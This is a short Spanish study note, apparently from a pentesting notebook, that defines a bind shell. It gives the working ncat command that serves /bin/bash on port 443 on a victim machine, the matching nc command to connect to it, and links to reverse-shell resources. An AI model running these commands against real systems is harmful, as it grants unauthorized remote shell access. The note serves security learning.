-----------
Tags: #shell #bash #lenguajes #BindShell  #explotación #explotation

---
# Definición

Una [[Bind Shell]] es una técnica utilizada en ciberseguridad donde el atacante configura un puerto en la máquina víctima para recibir conexiones entrantes. En este tipo de shell, la máquina víctima actúa como un servidor, abriendo un puerto específico y esperando que el atacante se conecte a él para obtener acceso remoto.

---
# Parámetros y Usos

- En el servidor se abre el puerto con una shell lanzada:
```bash
ncat -nlvp 443 -e /bin/bash
```

- En la maquina atacante se manda la conexión al servidor:
```bash
nc [IP DEL SERVIDOR] 443
```

![[Bind Shell.png]]

----------------------
# Referencias

- **Cheat Sheet** de Reverse Shell: [Enlace](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- **Generador** de Reverse Shell: [Enlace](https://www.revshells.com/)